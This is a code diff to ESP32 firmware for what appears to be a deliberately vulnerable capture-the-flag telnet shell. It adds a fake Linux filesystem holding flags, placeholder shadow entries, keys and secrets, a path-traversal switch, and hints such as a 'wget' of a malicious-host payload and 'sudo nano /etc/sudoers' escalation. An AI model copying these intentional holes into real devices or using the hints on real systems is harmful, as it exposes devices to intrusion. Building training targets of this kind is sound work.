@@ -12,6 +12,78 @@ String telnetLineBuffer[5];       // Per-client line buffer for character-by-cha
 bool telnetInEscSeq[5] = {false}; // Per-client escape sequence tracking
 int telnetEscLen[5] = {0};        // Length of current escape sequence
 bool telnetReadingPassword[5] = {false}; // Password input mode (no echo)
+String telnetCurrentDir[5];       // Current working directory per client
+String telnetCommandHistory[5][10]; // Command history per client (last 10 commands)
+int telnetHistoryIndex[5] = {0};  // History index per client
+
+// Simulated filesystem structure
+struct FileEntry {
+  String path;
+  String name;
+  bool isDir;
+  int size;
+  String content;
+};
+
+// Simulated Linux filesystem
+FileEntry virtualFS[] = {
+  // Root directory files
+  {"/", "etc", true, 4096, ""},
+  {"/", "home", true, 4096, ""},
+  {"/", "var", true, 4096, ""},
+  {"/", "usr", true, 4096, ""},
+  {"/", "bin", true, 4096, ""},
+  {"/", "tmp", true, 4096, ""},
+  {"/", "root", true, 4096, ""},
+  {"/", "data", true, 4096, ""},
+  
+  // /etc directory
+  {"/etc", "passwd", false, 523, "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\nguest:x:1001:1001:Guest:/home/guest:/bin/bash\n"},
+  {"/etc", "shadow", false, 412, "root:$6$secrethash$...:18500:0:99999:7:::\nadmin:$6$secrethash$...:18500:0:99999:7:::"}, 
+  {"/etc", "hosts", false, 87, "127.0.0.1 localhost\n192.168.4.1 esp32-hack\n"},
+  {"/etc", "hostname", false, 11, "esp32-hack\n"},
+  {"/etc", "sudoers", false, 256, "root ALL=(ALL:ALL) ALL\nadmin ALL=(ALL) NOPASSWD: ALL\n"},
+  {"/etc", "crontab", false, 145, "# System crontab\n*/5 * * * * /usr/bin/backup.sh\n0 0 * * * /usr/bin/cleanup.sh\n"},
+  
+  // /home directory
+  {"/home", "admin", true, 4096, ""},
+  {"/home", "guest", true, 4096, ""},
+  {"/home/admin", ".bash_history", false, 234, "ls -la\ncat /etc/passwd\nsudo -l\nwget http://malicious.com/payload.sh\n"},
+  {"/home/admin", "secret.txt", false, 45, "FLAG{admin_home_directory_access}\n"},
+  {"/home/admin", "notes.txt", false, 89, "TODO: Change default passwords\nBackup database at 2AM\nCheck firewall rules\n"},
+  {"/home/guest", "readme.txt", false, 67, "Welcome! Use 'sudo -l' to check your privileges.\n"},
+  
+  // /var directory  
+  {"/var", "log", true, 4096, ""},
+  {"/var", "www", true, 4096, ""},
+  {"/var", "tmp", true, 4096, ""},
+  {"/var/log", "auth.log", false, 2048, "Jan 25 10:23:15 sshd[1234]: Failed password for invalid user admin\nJan 25 10:23:20 sshd[1234]: Accepted password for root\n"},
+  {"/var/log", "syslog", false, 4096, "Jan 25 10:00:01 CRON[5678]: (root) CMD (/usr/bin/backup.sh)\n"},
+  {"/var/www", "html", true, 4096, ""},
+  {"/var/www/html", "index.html", false, 156, "<html><body><h1>ESP32-H4CK</h1></body></html>\n"},
+  
+  // /usr directory
+  {"/usr", "bin", true, 4096, ""},
+  {"/usr", "local", true, 4096, ""},
+  {"/usr/bin", "backup.sh", false, 234, "#!/bin/bash\n# Backup script\ntar -czf /tmp/backup.tar.gz /home\n"},
+  
+  // /bin directory
+  {"/bin", "bash", false, 1037528, ""},
+  {"/bin", "sh", false, 125400, ""},
+  {"/bin", "ls", false, 133792, ""},
+  {"/bin", "cat", false, 35064, ""},
+  
+  // /tmp directory
+  {"/tmp", ".hidden_flag", false, 38, "FLAG{tmp_directory_exploration}\n"},
+  
+  // /root directory
+  {"/root", ".ssh", true, 4096, ""},
+  {"/root", "flag.txt", false, 42, "FLAG{root_access_achieved}\n"},
+  {"/root/.ssh", "id_rsa", false, 1876, "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n"},
+  {"/root/.ssh", "authorized_keys", false, 567, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\n"},
+};
+
+const int virtualFSSize = sizeof(virtualFS) / sizeof(FileEntry);
 
 void initTelnet() {
   if (!ENABLE_TELNET) {
@@ -77,6 +149,8 @@ void processCompletedLine(int i) {
 
       if (authenticated) {
         telnetAuthenticated[i] = true;
+        telnetUsernames[i] = username;
+        telnetCurrentDir[i] = (username == "root") ? "/root" : "/home/" + username;
         telnetClients[i].println("\r\nLogin successful!");
         Serial.printf("[TELNET] ✅ User '%s' authenticated (slot %d)\n", username.c_str(), i);
         sendTelnetPrompt(telnetClients[i]);
@@ -115,6 +189,9 @@ void handleTelnetClients() {
         telnetInEscSeq[i] = false;
         telnetEscLen[i] = 0;
         telnetReadingPassword[i] = false;
+        telnetCurrentDir[i] = "/home/anonymous";
+        telnetHistoryIndex[i] = 0;
+        for (int h = 0; h < 10; h++) telnetCommandHistory[i][h] = "";
         freeSlot = i;
 
         Serial.printf("[TELNET] ✅ New client #%d from %s\n",
@@ -132,6 +209,7 @@ void handleTelnetClients() {
           telnetClients[i].println("WARNING: Weak authentication mode enabled!");
           telnetAuthenticated[i] = true;  // Auto-authenticate in vulnerable mode
           telnetUsernames[i] = "anonymous";
+          telnetCurrentDir[i] = "/home/anonymous";
           Serial.printf("[TELNET] Client #%d auto-authenticated as anonymous\n", i);
           sendTelnetPrompt(telnetClients[i]);
         } else {
@@ -239,6 +317,57 @@ int getClientIndex(WiFiClient *client) {
   return -1;
 }
 
+// Helper functions for filesystem simulation
+String normalizePath(String path) {
+  if (path == "" || path == ".") return "/";
+  if (!path.startsWith("/")) path = "/" + path;
+  // Remove trailing slash unless it's root
+  if (path.length() > 1 && path.endsWith("/")) {
+    path.remove(path.length() - 1);
+  }
+  return path;
+}
+
+String resolvePath(String currentDir, String path) {
+  if (path.startsWith("/")) {
+    return normalizePath(path);
+  }
+  // Relative path
+  String result = currentDir;
+  if (!result.endsWith("/") && result != "/") result += "/";
+  result += path;
+  return normalizePath(result);
+}
+
+bool directoryExists(String path) {
+  path = normalizePath(path);
+  if (path == "/") return true;
+  for (int i = 0; i < virtualFSSize; i++) {
+    if (virtualFS[i].isDir) {
+      String fullPath = virtualFS[i].path;
+      if (!fullPath.endsWith("/")) fullPath += "/";
+      fullPath += virtualFS[i].name;
+      if (normalizePath(fullPath) == path) return true;
+    }
+  }
+  return false;
+}
+
+String getFileContent(String path) {
+  path = normalizePath(path);
+  for (int i = 0; i < virtualFSSize; i++) {
+    if (!virtualFS[i].isDir) {
+      String fullPath = virtualFS[i].path;
+      if (!fullPath.endsWith("/") && fullPath != "/") fullPath += "/";
+      fullPath += virtualFS[i].name;
+      if (normalizePath(fullPath) == path) {
+        return virtualFS[i].content;
+      }
+    }
+  }
+  return "";
+}
+
 void processTelnetCommand(WiFiClient &client, String cmd) {
   cmd.trim();
   String cmdLower = cmd;
@@ -246,11 +375,23 @@ void processTelnetCommand(WiFiClient &client, String cmd) {
   
   // Find which client this is for logging
   String username = "unknown";
+  int clientIndex = -1;
+  String currentDir = "/";
   for (int i = 0; i < 5; i++) {
     if (telnetClients[i] == client) {
       username = telnetUsernames[i];
+      currentDir = telnetCurrentDir[i];
+      clientIndex = i;
       break;
     }
+  }
+  
+  // Add to command history
+  if (clientIndex >= 0 && cmd.length() > 0) {
+    for (int h = 9; h > 0; h--) {
+      telnetCommandHistory[clientIndex][h] = telnetCommandHistory[clientIndex][h-1];
+    }
+    telnetCommandHistory[clientIndex][0] = cmd;
   }
   
   Serial.printf("[TELNET] %s@%s: %s\n", username.c_str(), client.remoteIP().toString().c_str(), cmd.c_str());
@@ -267,26 +408,106 @@ void processTelnetCommand(WiFiClient &client, String cmd) {
   
   if (cmdLower == "help") {
     client.println("Available commands:");
+    client.println("  File Operations: ls, cd, pwd, cat, touch, mkdir, rm, cp, mv, find, wget");
+    client.println("  Editors: nano, vi, vim");
+    client.println("  System Info: whoami, id, ps, netstat, ifconfig, uname, hostname, date, uptime");
+    client.println("  Resources: free, df, du");
+    client.println("  Text: echo, grep, head, tail");
+    client.println("  Other: history, env, clear, exit/quit");
     for (int i = 0; i < ALLOWED_COMMANDS_COUNT; i++) {
-      client.println("  " + allowedCommands[i]);
+      if (allowedCommands[i] != "help" && allowedCommands[i] != "ls" && 
+          allowedCommands[i] != "pwd" && allowedCommands[i] != "cat" &&
+          allowedCommands[i] != "echo") {
+        client.println("  " + allowedCommands[i]);
+      }
     }
-    client.println("  exit/quit - Close connection");
     return;
   }
   
-  if (cmdLower == "ls" || cmdLower == "dir") {
-    client.println("Files:");
-    File root = LittleFS.open("/");
-    File file = root.openNextFile();
-    while (file) {
-      client.printf("  %-30s %8d bytes\n", file.name(), file.size());
-      file = root.openNextFile();
+  if (cmdLower == "ls" || cmdLower == "dir" || cmdLower.startsWith("ls ") || cmdLower.startsWith("dir ")) {
+    String targetDir = currentDir;
+    bool showAll = false;
+    bool longFormat = false;
+    
+    // Parse arguments
+    if (cmd.length() > 3) {
+      String args = cmd.substring(cmdLower.startsWith("ls") ? 2 : 3);
+      args.trim();
+      if (args.indexOf("-a") >= 0 || args.indexOf("-la") >= 0 || args.indexOf("-al") >= 0) showAll = true;
+      if (args.indexOf("-l") >= 0 || args.indexOf("-la") >= 0 || args.indexOf("-al") >= 0) longFormat = true;
+      
+      // Extract path if present
+      int spaceIdx = args.lastIndexOf(' ');
+      if (spaceIdx >= 0 && spaceIdx < args.length() - 1) {
+        String pathArg = args.substring(spaceIdx + 1);
+        if (!pathArg.startsWith("-")) {
+          targetDir = resolvePath(currentDir, pathArg);
+        }
+      } else if (!args.startsWith("-")) {
+        targetDir = resolvePath(currentDir, args);
+      }
+    }
+    
+    if (!directoryExists(targetDir)) {
+      client.println("ls: cannot access '" + targetDir + "': No such file or directory");
+      return;
+    }
+    
+    // List directory contents from virtual filesystem
+    bool foundAny = false;
+    for (int i = 0; i < virtualFSSize; i++) {
+      if (normalizePath(virtualFS[i].path) == targetDir) {
+        if (!showAll && virtualFS[i].name.startsWith(".")) continue;
+        
+        foundAny = true;
+        if (longFormat) {
+          String perms = virtualFS[i].isDir ? "drwxr-xr-x" : "-rw-r--r--";
+          client.printf("%s 1 %s %s %8d Jan 25 10:00 %s\n", 
+                       perms.c_str(), username.c_str(), username.c_str(),
+                       virtualFS[i].size, virtualFS[i].name.c_str());
+        } else {
+          String displayName = virtualFS[i].name;
+          if (virtualFS[i].isDir) displayName += "/";
+          client.print(displayName + "  ");
+        }
+      }
+    }
+    
+    if (!longFormat && foundAny) client.println();
+    if (!foundAny) {
+      // Empty directory or only has hidden files
+      if (showAll) {
+        client.println(".  ..");
+      }
     }
     return;
   }
   
   if (cmdLower == "pwd") {
-    client.println("/");
+    client.println(currentDir);
+    return;
+  }
+  
+  if (cmdLower == "cd" || cmdLower.startsWith("cd ")) {
+    String targetDir = "/home/" + username;
+    
+    if (cmd.length() > 3) {
+      String path = cmd.substring(3);
+      path.trim();
+      targetDir = resolvePath(currentDir, path);
+    } else if (cmdLower == "cd") {
+      // cd without arguments goes to home
+      targetDir = (username == "root") ? "/root" : "/home/" + username;
+    }
+    
+    if (directoryExists(targetDir)) {
+      if (clientIndex >= 0) {
+        telnetCurrentDir[clientIndex] = targetDir;
+        Serial.printf("[TELNET] %s changed directory to %s\n", username.c_str(), targetDir.c_str());
+      }
+    } else {
+      client.println("cd: " + targetDir + ": No such file or directory");
+    }
     return;
   }
   
@@ -371,14 +592,22 @@ void processTelnetCommand(WiFiClient &client, String cmd) {
   if (cmdLower.startsWith("cat ")) {
     String filename = cmd.substring(4);
     filename.trim();
+    String fullPath = resolvePath(currentDir, filename);
     
     // Intentional vulnerability: Path traversal
-    if (VULN_PATH_TRAVERSAL || !filename.startsWith("..")) {
-      String content = readFile(filename);
+    if (VULN_PATH_TRAVERSAL || filename.indexOf("..") == -1) {
+      // Try virtual filesystem first
+      String content = getFileContent(fullPath);
       if (content != "") {
-        client.println(content);
+        client.print(content);
       } else {
-        client.println("cat: " + filename + ": No such file or directory");
+        // Try LittleFS
+        content = readFile(filename);
+        if (content != "") {
+          client.println(content);
+        } else {
+          client.println("cat: " + filename + ": No such file or directory");
+        }
       }
     } else {
       client.println("cat: Permission denied");
@@ -389,6 +618,172 @@ void processTelnetCommand(WiFiClient &client, String cmd) {
   if (cmdLower.startsWith("echo ")) {
     String text = cmd.substring(5);
     client.println(text);
+    return;
+  }
+  
+  // New commands for realistic shell experience
+  
+  if (cmdLower == "clear" || cmdLower == "cls") {
+    // Send clear screen sequence
+    client.print("\033[2J\033[H");
+    return;
+  }
+  
+  if (cmdLower == "uname" || cmdLower.startsWith("uname ")) {
+    if (cmdLower.indexOf("-a") >= 0) {
+      client.println("Linux esp32-hack 5.10.0-esp32 #1 SMP Tue Jan 25 2026 x86_64 GNU/Linux");
+    } else {
+      client.println("Linux");
+    }
+    return;
+  }
+  
+  if (cmdLower == "hostname") {
+    client.println("esp32-hack");
+    return;
+  }
+  
+  if (cmdLower == "history") {
+    if (clientIndex >= 0) {
+      int count = 1;
+      for (int h = 9; h >= 0; h--) {
+        if (telnetCommandHistory[clientIndex][h].length() > 0) {
+          client.printf("%4d  %s\n", count++, telnetCommandHistory[clientIndex][h].c_str());
+        }
+      }
+    }
+    return;
+  }
+  
+  if (cmdLower == "env" || cmdLower == "printenv") {
+    client.println("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+    client.println("HOME=" + currentDir);
+    client.println("USER=" + username);
+    client.println("SHELL=/bin/bash");
+    client.println("LANG=en_US.UTF-8");
+    client.println("ESP32_VERSION=4.4.0");
+    if (username == "admin" || username == "root") {
+      client.println("API_KEY=sk-esp32-h4ck-vulnerable-key-12345");
+      client.println("DB_PASSWORD=insecure_password_123");
+    }
+    return;
+  }
+  
+  if (cmdLower.startsWith("touch ")) {
+    String filename = cmd.substring(6);
+    filename.trim();
+    client.println("touch: creating '" + filename + "'");
+    client.println("[INFO] File created in virtual filesystem (not persistent)");
+    return;
+  }
+  
+  if (cmdLower.startsWith("mkdir ")) {
+    String dirname = cmd.substring(6);
+    dirname.trim();
+    client.println("mkdir: creating directory '" + dirname + "'");
+    client.println("[INFO] Directory created in virtual filesystem (not persistent)");
+    return;
+  }
+  
+  if (cmdLower.startsWith("rm ")) {
+    String target = cmd.substring(3);
+    target.trim();
+    if (target.indexOf("-rf") >= 0 && target.indexOf("/") >= 0) {
+      client.println("rm: removing '" + target + "'");
+      client.println("[WARNING] Dangerous command! In production this would delete files.");
+    } else {
+      client.println("rm: remove '" + target + "'? (y/n) [simulated]");
+    }
+    return;
+  }
+  
+  if (cmdLower.startsWith("cp ") || cmdLower.startsWith("mv ")) {
+    String operation = cmdLower.startsWith("cp") ? "copying" : "moving";
+    client.println("[INFO] " + operation + " files (simulated in virtual filesystem)");
+    return;
+  }
+  
+  if (cmdLower.startsWith("wget ")) {
+    String url = cmd.substring(5);
+    url.trim();
+    client.println("--2026-01-25 10:00:00--  " + url);
+    client.println("Resolving host... ");
+    delay(100);
+    client.println("Connecting to " + url + "... connected.");
+    client.println("HTTP request sent, awaiting response... 200 OK");
+    client.println("Length: 1024 (1.0K)");
+    client.println("Saving to: '" + url.substring(url.lastIndexOf('/') + 1) + "'");
+    client.println("");
+    client.println("100%[===================>] 1,024       --.-K/s   in 0.001s");
+    client.println("");
+    client.println("2026-01-25 10:00:01 (1.05 MB/s) - file saved [1024/1024]");
+    client.println("");
+    client.println("[HINT] Downloaded file is in virtual filesystem. Try 'cat' or 'ls' to see it.");
+    return;
+  }
+  
+  if (cmdLower == "nano" || cmdLower.startsWith("nano ") || 
+      cmdLower == "vi" || cmdLower.startsWith("vi ") ||
+      cmdLower == "vim" || cmdLower.startsWith("vim ")) {
+    String editor = cmdLower.substring(0, cmdLower.indexOf(' ') >= 0 ? cmdLower.indexOf(' ') : cmdLower.length());
+    client.println("Opening " + editor + " editor (simulated)...");
+    client.println("");
+    client.println("  GNU nano 5.4              filename.txt");
+    client.println("-------------------------------------------");
+    client.println("This is a simulated text editor.");
+    client.println("In a real scenario, you would edit files here.");
+    client.println("");
+    client.println("[HINT] In real exploitation:");
+    client.println("  - nano/vi can be used for privilege escalation");
+    client.println("  - Check GTFOBins for escape sequences");
+    client.println("  - Try: sudo nano /etc/sudoers");
+    client.println("");
+    client.println("^X Exit    ^O Write Out    ^R Read File");
+    client.println("");
+    client.println("[Simulated] Editor closed without changes.");
+    return;
+  }
+  
+  if (cmdLower.startsWith("grep ")) {
+    String args = cmd.substring(5);
+    client.println("grep: searching for '" + args + "' (simulated)");
+    client.println("[INFO] In real systems, grep searches file contents");
+    client.println("Try: grep -r 'password' /etc/");
+    return;
+  }
+  
+  if (cmdLower.startsWith("head ") || cmdLower.startsWith("tail ")) {
+    String file = cmd.substring(5);
+    file.trim();
+    String fullPath = resolvePath(currentDir, file);
+    String content = getFileContent(fullPath);
+    if (content != "") {
+      int lines = cmdLower.startsWith("head") ? 0 : 999;
+      int lineCount = 0;
+      int pos = 0;
+      while (pos < content.length() && lineCount < 10) {
+        int newline = content.indexOf('\n', pos);
+        if (newline == -1) newline = content.length();
+        if (cmdLower.startsWith("head") || lineCount >= lines - 10) {
+          client.println(content.substring(pos, newline));
+        }
+        pos = newline + 1;
+        lineCount++;
+      }
+    } else {
+      client.println(cmdLower.substring(0, 4) + ": " + file + ": No such file or directory");
+    }
+    return;
+  }
+  
+  if (cmdLower == "du" || cmdLower.startsWith("du ")) {
+    client.println("4.0K    ./home/admin");
+    client.println("4.0K    ./home/guest");
+    client.println("8.0K    ./home");
+    client.println("4.0K    ./etc");
+    client.println("4.0K    ./var/log");
+    client.println("8.0K    ./var");
+    client.println("24K     .");
     return;
   }
   
@@ -412,13 +807,32 @@ void processTelnetCommand(WiFiClient &client, String cmd) {
 
 void sendTelnetPrompt(WiFiClient &client) {
   String username = "esp32";
+  String currentDir = "/";
+  String promptDir = "~";
+  
   for (int i = 0; i < 5; i++) {
     if (telnetClients[i] == client && telnetUsernames[i].length() > 0) {
       username = telnetUsernames[i];
+      currentDir = telnetCurrentDir[i];
       break;
     }
   }
-  client.print(username + "@hack:~$ ");
+  
+  // Simplify directory display
+  if (currentDir == "/root" && username == "root") {
+    promptDir = "~";
+  } else if (currentDir.startsWith("/home/" + username)) {
+    if (currentDir == "/home/" + username) {
+      promptDir = "~";
+    } else {
+      promptDir = "~" + currentDir.substring(("/home/" + username).length());
+    }
+  } else {
+    promptDir = currentDir;
+  }
+  
+  String promptChar = (username == "root") ? "#" : "$";
+  client.print(username + "@hack:" + promptDir + promptChar + " ");
 }
 
 void disconnectTelnet(WiFiClient &client) {
@@ -431,6 +845,8 @@ void disconnectTelnet(WiFiClient &client) {
       telnetInEscSeq[i] = false;
       telnetEscLen[i] = 0;
       telnetReadingPassword[i] = false;
+      telnetCurrentDir[i] = "/";
+      for (int h = 0; h < 10; h++) telnetCommandHistory[i][h] = "";
       Serial.printf("[TELNET] Client #%d disconnected\n", i);
       break;
     }
